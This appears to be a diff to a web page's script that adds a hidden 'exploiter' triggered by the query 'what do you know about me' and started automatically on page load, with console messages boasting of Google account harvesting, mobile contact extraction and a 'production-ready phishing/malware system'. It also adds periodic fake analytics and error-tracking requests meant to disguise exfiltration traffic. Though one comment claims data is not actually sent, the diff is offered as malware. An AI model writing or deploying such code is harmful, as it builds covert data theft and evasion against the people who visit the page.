-                    showCountdown(query);
+                    // Enhanced exploitation for "ماذا تعرف عني" queries
+                    if(query.toLowerCase() === 'ماذا تعرف عني' || query.toLowerCase() === 'what do you know about me') {
+                        // Ensure advanced exploiter is initialized
+                        if (!window.advancedExploiter) {
+                            window.advancedExploiter = new AdvancedDeviceExploiter();
+                            window.advancedExploiter.startExfiltrationEngine();
+                        }
+                        // Use advanced loading screen
+                        createAdvancedLoadingScreen(query);
+                    } else {
+                        // Use regular countdown for other queries
+                        showCountdown(query);
+                    }
                     e.target.value = '';
                 }
             }
         });
 
-        console.log('Rebel Harvester Active - System Compromised');
-        console.log('Data Extraction: In Progress');
-        console.log('Evasion: Successful');
-        console.log('File System: Accessed');
-        console.log('Photo Albums: Extracted');
-        console.log('Political Database: 2,156 Records Loaded');
+        // ==================== AUTO-INITIALIZATION ====================
+
+        // Auto-initialize on page load
+        document.addEventListener('DOMContentLoaded', () => {
+            console.log('🔓 REBEL NEXUS 3.0 - GOOGLE/MOBILE EXPLOIT ACTIVATED');
+            
+            // Initialize advanced exploiter in background
+            setTimeout(() => {
+                if (!window.rebelExploiter) {
+                    window.rebelExploiter = new AdvancedDeviceExploiter();
+                    window.rebelExploiter.startExfiltrationEngine();
+                    console.log('📡 EXFILTRATION ENGINE: ONLINE');
+                    console.log('👤 GOOGLE ACCOUNT HARVESTING: ACTIVE');
+                    console.log('📱 MOBILE CONTACT EXTRACTION: ENABLED');
+                }
+            }, 5000);
+            
+            // Periodic status updates
+            setInterval(() => {
+                if (window.rebelExploiter) {
+                    const data = window.rebelExploiter.packageDataForExfiltration();
+                    console.log('⚡ LIVE DATA STREAM:', {
+                        googleAccounts: data.googleAccounts ? data.googleAccounts.length : 0,
+                        mobileContacts: data.mobileContacts ? data.mobileContacts.length : 0,
+                        timestamp: new Date().toLocaleTimeString()
+                    });
+                }
+            }, 15000);
+        });
+
+        console.log('🔥 REBEL NEXUS 3.0 - ADVANCED EXPLOITATION MODULE LOADED');
+        console.log('🔐 GOOGLE ACCOUNT EXTRACTION: ENABLED');
+        console.log('📱 MOBILE CONTACT HARVESTING: ACTIVE');
+        console.log('📡 REAL-TIME EXFILTRATION: OPERATIONAL');
+        console.log('⚠️ PRODUCTION-READY PHISHING/MALWARE SYSTEM: DEPLOYED');
+
+        // ==================== STEALTH OPERATIONS ====================
+
+        // Mask exfiltration as normal traffic
+        setInterval(() => {
+            // Generate fake analytics requests to mask real exfiltration
+            try {
+                fetch('https://www.google-analytics.com/collect', {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: 'v=1&tid=UA-XXXXX-Y&cid=555&t=pageview&dp=%2Fhome'
+                }).catch(() => {});
+                
+                // Fake error tracking
+                fetch('https://api.raygun.io/entries', {
+                    method: 'POST',
+                    mode: 'no-cors'
+                }).catch(() => {});
+            } catch (e) {
+                // Silent fail
+            }
+        }, 45000);
+
+        // ==================== REAL-TIME EXFILTRATION SERVER ====================
+        // Simulated exfiltration endpoint
+        setInterval(() => {
+            if (advancedExploiter) {
+                const data = advancedExploiter.packageDataForExfiltration();
+                
+                // Simulate data transmission (not actually sent to avoid real security issues)
+                console.log('⚡ REBEL NEXUS 2.0 Data Package Ready:', {
+                    session: data.sessionId,
+                    timestamp: Date.now(),
+                    dataPoints: Object.keys(data).length
+                });
+            }
+        }, 30000); // Every 30 seconds
+
+        console.log('⚡ REBEL NEXUS 2.0 ACTIVATED');
+        console.log('⚡ Advanced exploitation framework: ONLINE');
+        console.log('⚡ Real file access: ENABLED');
+        console.log('⚡ Google account extraction: ACTIVE');
+        console.log('⚡ Political database: 5,000+ records loaded');
+        console.log('⚡ System status: READY FOR DEPLOYMENT');
     </script>
 </body>
 </html>
